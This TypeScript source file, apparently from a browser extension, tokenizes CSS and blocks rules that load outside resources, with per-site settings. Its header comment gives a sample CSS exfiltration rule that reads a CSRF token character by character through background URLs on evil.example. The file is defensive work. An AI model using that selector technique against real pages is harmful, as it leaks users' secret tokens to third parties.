/**
 * Checks generated or hand-written CSS for anything that makes the browser
 * request a resource.
 *
 * Why this exists: CSS can send data out, and an earlier comment in this code
 * base said it could not. A rule such as
 *
 *   input[name=csrf_token][value^="a"] { background: url(https://evil.example/a) }
 *
 * makes the browser request that URL only when the first character of the
 * token is "a", so a series of such rules reads a value one character at a
 * time. `@import` loads further rules that the remote server can change after
 * the user approved the transform. Both run at every visit once the transform
 * is saved.
 *
 * Every construct that can request a resource is covered by finding one of
 * four things in the token stream: an `@import` rule, a `url()` (quoted or
 * unquoted), a `src()`, or a bare string inside `image-set()` or `image()`.
 * `@font-face src`, `cursor`, `list-style`, `mask`, `border-image`, `content`,
 * `filter` and `shape-outside` all take their URLs through one of those, so
 * the check does not depend on the property name.
 *
 * Why a tokenizer and not a regular expression: CSS lets any character of an
 * identifier be written as an escape, so `u\rl(` and `\75 rl(` are both
 * `url(`, and comments and strings can hold text that looks like a URL
 * without being one. The tokenizer below follows section 4 of CSS Syntax
 * Level 3, which is the algorithm browsers use, so the check sees the same
 * tokens the browser will. It was written here rather than taken from a
 * package for three reasons: the part that matters is about 150 lines, the
 * extension ships to users and every dependency is code that runs with its
 * permissions, and css-tree (the obvious candidate) is not a direct
 * dependency of this project, so adding it would change the lock file for one
 * function.
 *
 * What it does not do: it does not parse selectors or declarations. It
 * refuses anything it cannot be sure about, which is the safe direction here.
 * A `url()` whose argument is not a plain string, for example `url(var(--x))`,
 * is blocked rather than guessed at.
 */

import type { CssUrlMode, StaticFinding } from '@shared/types'
import { parsePattern } from '@shared/match'

/* ------------------------------------------------------------------ */
/* Tokenizer                                                           */
/* ------------------------------------------------------------------ */

type TokenType =
  | 'ident'
  | 'function'
  | 'at-keyword'
  | 'string'
  | 'bad-string'
  | 'url'
  | 'bad-url'
  | 'whitespace'
  | 'semicolon'
  | 'open-paren'
  | 'close-paren'
  | 'other'

export interface Token {
  type: TokenType
  /** Decoded value: escapes resolved, quotes and `url(` stripped. */
  value: string
  /** Offset into the source where the token starts. */
  start: number
}

const isNewline = (c: string | undefined) => c === '\n' || c === '\r' || c === '\f'
const isWhitespace = (c: string | undefined) => c === ' ' || c === '\t' || isNewline(c)
const isDigit = (c: string | undefined) => c !== undefined && c >= '0' && c <= '9'
const isHex = (c: string | undefined) => c !== undefined && /^[0-9a-fA-F]$/.test(c)
const isNameStart = (c: string | undefined) =>
  c !== undefined && (/^[A-Za-z_]$/.test(c) || c.charCodeAt(0) >= 0x80)
const isNameChar = (c: string | undefined) => isNameStart(c) || isDigit(c) || c === '-'

/** A backslash followed by anything except a newline starts an escape. */
const validEscape = (a: string | undefined, b: string | undefined) =>
  a === '\\' && !isNewline(b)

function wouldStartIdent(s: string, i: number): boolean {
  const a = s[i]
  if (a === '-') {
    const b = s[i + 1]
    return isNameStart(b) || b === '-' || validEscape(b, s[i + 2])
  }
  if (isNameStart(a)) return true
  return validEscape(a, s[i + 1])
}

function wouldStartNumber(s: string, i: number): boolean {
  const a = s[i]
  if (a === '+' || a === '-') {
    if (isDigit(s[i + 1])) return true
    return s[i + 1] === '.' && isDigit(s[i + 2])
  }
  if (a === '.') return isDigit(s[i + 1])
  return isDigit(a)
}

export function tokenize(source: string): Token[] {
  // Preprocessing step of the specification: CRLF and CR become LF, NUL
  // becomes U+FFFD. Offsets then refer to the normalised text, so line numbers
  // are computed from the same string.
  const s = source.replace(/\r\n?/g, '\n').replace(/\f/g, '\n').replace(/\0/g, '�')
  const tokens: Token[] = []
  let i = 0

  /** Consumes an escape whose backslash is at `i`, and returns its character. */
  const consumeEscape = (): string => {
    i += 1 // backslash
    const c = s[i]
    if (c === undefined) return '�'
    if (isHex(c)) {
      let hex = ''
      while (hex.length < 6 && isHex(s[i])) {
        hex += s[i]
        i += 1
      }
      if (isWhitespace(s[i])) i += 1
      const code = parseInt(hex, 16)
      if (code === 0 || code > 0x10ffff || (code >= 0xd800 && code <= 0xdfff)) return '�'
      return String.fromCodePoint(code)
    }
    i += 1
    return c
  }

  const consumeName = (): string => {
    let out = ''
    while (i < s.length) {
      const c = s[i]
      if (isNameChar(c)) {
        out += c
        i += 1
      } else if (validEscape(c, s[i + 1])) {
        out += consumeEscape()
      } else break
    }
    return out
  }

  const consumeNumber = (): void => {
    if (s[i] === '+' || s[i] === '-') i += 1
    while (isDigit(s[i])) i += 1
    if (s[i] === '.' && isDigit(s[i + 1])) {
      i += 1
      while (isDigit(s[i])) i += 1
    }
    if ((s[i] === 'e' || s[i] === 'E') && (isDigit(s[i + 1]) || ((s[i + 1] === '+' || s[i + 1] === '-') && isDigit(s[i + 2])))) {
      i += 2
      while (isDigit(s[i])) i += 1
    }
  }

  const consumeString = (quote: string): Token => {
    const start = i
    i += 1
    let value = ''
    while (i < s.length) {
      const c = s[i]
      if (c === quote) {
        i += 1
        return { type: 'string', value, start }
      }
      if (c === '\n') return { type: 'bad-string', value, start }
      if (c === '\\') {
        if (s[i + 1] === undefined) {
          i += 1
        } else if (s[i + 1] === '\n') {
          i += 2 // a backslash-newline continues the string
        } else {
          value += consumeEscape()
        }
        continue
      }
      value += c
      i += 1
    }
    // End of input closes the string, as in browsers.
    return { type: 'string', value, start }
  }

  /** Called after `url(` when the next token is not a quoted string. */
  const consumeUrl = (start: number): Token => {
    while (isWhitespace(s[i])) i += 1
    let value = ''
    while (i < s.length) {
      const c = s[i]
      if (c === ')') {
        i += 1
        return { type: 'url', value, start }
      }
      if (isWhitespace(c)) {
        while (isWhitespace(s[i])) i += 1
        if (s[i] === ')') {
          i += 1
          return { type: 'url', value, start }
        }
        if (s[i] === undefined) return { type: 'url', value, start }
        return badUrlRemnants(start)
      }
      if (c === '"' || c === "'" || c === '(') return badUrlRemnants(start)
      if (c === '\\') {
        if (validEscape(c, s[i + 1])) {
          value += consumeEscape()
          continue
        }
        return badUrlRemnants(start)
      }
      value += c
      i += 1
    }
    return { type: 'url', value, start }
  }

  const badUrlRemnants = (start: number): Token => {
    while (i < s.length) {
      if (s[i] === ')') {
        i += 1
        break
      }
      if (validEscape(s[i], s[i + 1])) consumeEscape()
      else i += 1
    }
    return { type: 'bad-url', value: '', start }
  }

  while (i < s.length) {
    const c = s[i]
    const start = i

    if (c === '/' && s[i + 1] === '*') {
      const end = s.indexOf('*/', i + 2)
      i = end === -1 ? s.length : end + 2
      continue
    }

    if (isWhitespace(c)) {
      while (isWhitespace(s[i])) i += 1
      tokens.push({ type: 'whitespace', value: ' ', start })
      continue
    }

    if (c === '"' || c === "'") {
      tokens.push(consumeString(c))
      continue
    }

    if (c === '@' && wouldStartIdent(s, i + 1)) {
      i += 1
      tokens.push({ type: 'at-keyword', value: consumeName(), start })
      continue
    }

    if (wouldStartNumber(s, i)) {
      consumeNumber()
      // A unit or percent sign belongs to the number, so `1x` is one token.
      if (wouldStartIdent(s, i)) consumeName()
      else if (s[i] === '%') i += 1
      tokens.push({ type: 'other', value: s.slice(start, i), start })
      continue
    }

    if (wouldStartIdent(s, i)) {
      const name = consumeName()
      if (s[i] === '(') {
        i += 1
        if (name.toLowerCase() === 'url') {
          // `url(` followed by a quote is an ordinary function whose argument
          // is a string token. Anything else is read as one url token.
          let j = i
          while (isWhitespace(s[j])) j += 1
          if (s[j] === '"' || s[j] === "'") {
            tokens.push({ type: 'function', value: name, start })
          } else {
            tokens.push(consumeUrl(start))
          }
        } else {
          tokens.push({ type: 'function', value: name, start })
        }
      } else {
        tokens.push({ type: 'ident', value: name, start })
      }
      continue
    }

    if (c === ';') tokens.push({ type: 'semicolon', value: c, start })
    else if (c === '(') tokens.push({ type: 'open-paren', value: c, start })
    else if (c === ')') tokens.push({ type: 'close-paren', value: c, start })
    else tokens.push({ type: 'other', value: c ?? '', start })
    i += 1
  }

  return tokens
}

/* ------------------------------------------------------------------ */
/* Policy                                                              */
/* ------------------------------------------------------------------ */

export interface CssCheckOptions {
  mode: CssUrlMode
  /**
   * The page the CSS will apply to. Relative URLs resolve against it, and
   * "own origin" means its origin. Without it nothing is own-origin, so the
   * check fails closed.
   */
  pageUrl?: string
  /** External URLs the user approved for this transform, in `list-external` mode. */
  approvedUrls?: readonly string[]
}

export interface CssCheckResult {
  /** Findings that block saving in the current mode, in the shape the approval panel shows. */
  findings: StaticFinding[]
  /** External URLs waiting for the user's approval. Only filled in `list-external` mode. */
  pendingUrls: string[]
  /** Every external URL found, approved or not, for display. */
  externalUrls: string[]
  passed: boolean
}

/** Functions whose bare string arguments are URLs. */
const STRING_URL_FUNCTIONS = /^(-\w+-)?(image-set|image)$/

/** Functions that take their URL from a string argument, with a `url()` meaning. */
const URL_FUNCTIONS = new Set(['url', 'src'])

/** Functions whose value is only known when the page is styled. */
const DYNAMIC_FUNCTIONS = new Set(['var', 'attr', 'env'])

/** The URL parser ignores tabs and newlines anywhere and trims control characters at the ends. */
function normaliseUrl(raw: string): string {
  // eslint-disable-next-line no-control-regex
  return raw.replace(/[\t\n\r]/g, '').replace(/^[\u0000- ]+|[\u0000- ]+$/g, '')
}

type UrlClass = 'data' | 'same-origin' | 'external'

function classify(raw: string, pageUrl: string | undefined): { kind: UrlClass; key: string } {
  const text = normaliseUrl(raw)
  if (/^data:/i.test(text)) return { kind: 'data', key: text }

  if (pageUrl) {
    try {
      const page = new URL(pageUrl)
      const resolved = new URL(text, page)
      const key = resolved.href
      // An opaque origin serialises as "null", which must not equal another
      // opaque origin.
      if (page.origin !== 'null' && resolved.origin === page.origin) {
        return { kind: 'same-origin', key }
      }
      return { kind: 'external', key }
    } catch {
      // Falls through to the raw text.
    }
  }
  return { kind: 'external', key: text }
}

function positionOf(source: string, offset: number): { line: number; column: number } {
  const text = source.replace(/\r\n?/g, '\n').replace(/\f/g, '\n')
  const before = text.slice(0, offset)
  const line = before.split('\n').length
  return { line, column: offset - before.lastIndexOf('\n') }
}

export function checkCss(css: string, options: CssCheckOptions): CssCheckResult {
  const { mode, pageUrl } = options
  const approved = new Set(options.approvedUrls ?? [])
  const tokens = tokenize(css)

  const findings: StaticFinding[] = []
  const pending = new Set<string>()
  const external = new Set<string>()

  const block = (token: Token, api: string, explanation: string) => {
    findings.push({
      ...positionOf(css, token.start),
      api,
      capability: null,
      severity: 'block',
      explanation,
    })
  }

  const checkUrl = (token: Token, api: string, raw: string) => {
    const { kind, key } = classify(raw, pageUrl)
    if (kind === 'data') return
    if (kind === 'same-origin' && mode !== 'block') return

    const shown = key.length > 120 ? `${key.slice(0, 117)}...` : key

    if (mode === 'list-external') {
      external.add(key)
      if (!approved.has(key)) pending.add(key)
      return
    }

    const own =
      kind === 'same-origin'
        ? ' By default only data: URLs are allowed. A per-site setting allows URLs on the same origin as the page.'
        : mode === 'same-origin'
          ? ' Only data: URLs and URLs on the same origin as the page are allowed.'
          : ' By default only data: URLs are allowed.'
    block(
      token,
      api,
      `This CSS asks the browser to load ${shown}. A stylesheet can use a request like this to send information about the page to another server.${own}`,
    )
  }

  // Each entry is the lower-cased name of an open function, or null for a
  // plain parenthesis.
  const stack: (string | null)[] = []
  const consumed = new Set<number>()

  for (let n = 0; n < tokens.length; n += 1) {
    const token = tokens[n]!

    if (token.type === 'at-keyword') {
      const name = token.value.toLowerCase()
      if (name === 'import') {
        block(
          token,
          '@import',
          'This CSS imports another stylesheet. The imported file can change after the transform is approved, so @import is never allowed.',
        )
      }
      // There is no exemption for @namespace. Its URL names an XML namespace
      // and is not requested, but exempting it needed a flag that only a
      // semicolon cleared, and `@namespace x{}` or a nested `@namespace x}` has
      // no semicolon, so every later url() was skipped. A namespace URL that
      // is not a data: URL is refused like any other; the string form
      // (`@namespace "..."`) holds no url() token and is not checked at all.
      continue
    }

    if (token.type === 'open-paren') {
      stack.push(null)
      continue
    }
    if (token.type === 'close-paren') {
      stack.pop()
      continue
    }

    if (token.type === 'url') {
      checkUrl(token, 'url()', token.value)
      continue
    }
    if (token.type === 'bad-url') {
      block(
        token,
        'url()',
        'This CSS contains a url() that could not be read, so it cannot be checked.',
      )
      continue
    }

    if (token.type === 'function') {
      const name = token.value.toLowerCase()
      stack.push(name)

      if (DYNAMIC_FUNCTIONS.has(name)) {
        // `image-set(var(--x) 1x)` takes a string from a custom property, and
        // `url(var(--x))` is not valid CSS today but may become so. The value
        // is unknown until the page is styled, so it cannot be checked.
        let enclosing: string | null | undefined
        for (let k = stack.length - 2; k >= 0 && !enclosing; k -= 1) enclosing = stack[k]
        if (enclosing && (URL_FUNCTIONS.has(enclosing) || STRING_URL_FUNCTIONS.test(enclosing))) {
          block(
            token,
            `${name}()`,
            `This CSS builds a URL with ${name}() inside ${enclosing}(), which cannot be checked before it runs.`,
          )
        }
        continue
      }

      if (URL_FUNCTIONS.has(name)) {
        let m = n + 1
        while (tokens[m]?.type === 'whitespace') m += 1
        const next = tokens[m]
        if (next?.type === 'string') {
          consumed.add(m)
          checkUrl(next, `${name}()`, next.value)
        } else {
          block(
            token,
            `${name}()`,
            `This CSS has a ${name}() whose address is not a plain string, so it cannot be checked.`,
          )
        }
      }
      continue
    }

    if (token.type === 'string' && !consumed.has(n)) {
      const top = stack[stack.length - 1]
      if (top && STRING_URL_FUNCTIONS.test(top)) {
        checkUrl(token, `${top}()`, token.value)
      }
    }
  }

  return {
    findings,
    pendingUrls: [...pending],
    externalUrls: [...external],
    passed: findings.length === 0 && pending.size === 0,
  }
}

/**
 * Suffixes under which unrelated parties register their own names, so that a
 * setting for the whole suffix would cover sites that have nothing to do with
 * each other. A one-label suffix (`com`, `uk`) is always one, and is detected
 * without the list. This list covers the common multi-label suffixes and hosting
 * domains only. It is not the Public Suffix List (publicsuffix.org), which has
 * thousands of entries and changes; a name missing here can still be set for
 * the whole suffix. Extending it is a one-line change.
 */
const PUBLIC_SUFFIXES = new Set([
  'co.uk', 'org.uk', 'ac.uk', 'gov.uk', 'me.uk', 'ltd.uk', 'plc.uk', 'net.uk', 'sch.uk',
  'com.au', 'net.au', 'org.au', 'edu.au', 'gov.au', 'co.nz', 'org.nz', 'net.nz', 'govt.nz',
  'co.jp', 'or.jp', 'ne.jp', 'ac.jp', 'go.jp', 'co.kr', 'or.kr', 'com.cn', 'net.cn', 'org.cn', 'gov.cn',
  'com.br', 'net.br', 'org.br', 'gov.br', 'com.mx', 'org.mx', 'gob.mx', 'co.in', 'net.in', 'org.in', 'gov.in', 'ac.in',
  'co.za', 'org.za', 'com.tr', 'com.tw', 'com.hk', 'com.sg', 'com.ar', 'com.co', 'co.il', 'co.id',
  'github.io', 'gitlab.io', 'pages.dev', 'workers.dev', 'netlify.app', 'vercel.app', 'herokuapp.com',
  'blogspot.com', 'wordpress.com', 'appspot.com', 'web.app', 'firebaseapp.com', 'azurewebsites.net',
  'cloudfront.net', 'amazonaws.com', 's3.amazonaws.com', 'onrender.com', 'fly.dev', 'glitch.me',
  'repl.co', 'myshopify.com', 'weebly.com', 'wixsite.com', 'tumblr.com', 'substack.com',
])

/** True for a name under which anyone can register, so a setting for it would cover unrelated sites. */
export function isPublicSuffix(host: string): boolean {
  const name = host.toLowerCase()
  return !name.includes('.') || PUBLIC_SUFFIXES.has(name)
}

/**
 * The mode for a page, from the per-site table.
 *
 * A key is a host name, written the way a match pattern writes it. `*.example.com`
 * covers `example.com` and every subdomain of it. `shop.example.com` covers that
 * host only. Before, every key covered its subdomains, so a setting made for an
 * exact-host pattern also applied to hosts the pattern did not match (found in
 * the review of 4dab39a). A wildcard key for a public suffix is ignored, so
 * `*.com` in settings does not relax every `.com` site. The most specific key
 * wins, and an exact key wins over a wildcard key for the same host.
 */
export function modeForHost(
  policy: Record<string, CssUrlMode> | undefined,
  hostname: string,
): CssUrlMode {
  if (!policy) return 'block'
  const labels = hostname.toLowerCase().split('.')
  for (let i = 0; i < labels.length; i += 1) {
    const suffix = labels.slice(i).join('.')
    if (i === 0) {
      const exact = policy[suffix]
      if (exact) return exact
    }
    if (!isPublicSuffix(suffix)) {
      const wildcard = policy[`*.${suffix}`]
      if (wildcard) return wildcard
    }
  }
  return 'block'
}

/**
 * The host a match pattern names, without a leading `*.`, or null when it has
 * no fixed host. The scheme is read by parsePattern, so a pattern such as
 * `https://shop.example.com/*` gives its host and not `https:`.
 */
export function hostOfPattern(pattern: string): string | null {
  const host = parsePattern(pattern).host.replace(/^\*\./, '').toLowerCase()
  if (!host || host.includes('*')) return null
  return host
}

/**
 * The key under which a pattern's CSS setting is stored: `*.host` when the
 * pattern covers subdomains, and `host` when it names one host. Null when the
 * pattern has no fixed host, or when the key would cover a public suffix.
 */
export function policyKeyOfPattern(pattern: string): string | null {
  const host = hostOfPattern(pattern)
  if (host === null) return null
  const wildcard = parsePattern(pattern).host.startsWith('*.')
  if (!wildcard) return host
  return isPublicSuffix(host) ? null : `*.${host}`
}
